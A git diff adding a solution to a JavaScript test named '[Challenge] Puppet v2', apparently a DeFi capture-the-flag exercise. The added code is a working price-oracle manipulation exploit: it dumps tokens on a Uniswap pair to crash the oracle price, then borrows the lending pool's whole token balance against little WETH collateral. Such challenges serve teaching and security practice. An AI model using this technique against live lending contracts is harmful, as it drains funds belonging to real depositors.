@@ -82,6 +82,29 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+         // Approve token to be swapped
+         await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        // Check initial deposit needed
+        const initialDeposit = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("INITIAL DEPOSIT", ethers.utils.formatEther(initialDeposit));
+
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE,                  // Swap lall of the attacker's tokens.
+            0,                                               // We don't care how much ether we get back.
+            [this.token.address, this.uniswapRouter.WETH()], // Swap path from token to ether.
+            attacker.address,                                // Ether to attacker account.
+            9999999999                                       // No deadline.
+        );
+        console.log('Attacker`s eth balance:', (await ethers.provider.getBalance(attacker.address)).toString());
+        const deposit2 = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("DEPOSIT2", ethers.utils.formatEther(deposit2));
+
+        const collateral = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log('Required collateral in eth:', collateral.toString());
+        // Convert ether to WETH, give allowance to pool contract and use it to borrow DVT.
+        await this.weth.connect(attacker).deposit({ value: collateral });
+        await this.weth.connect(attacker).approve(this.lendingPool.address, collateral);
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
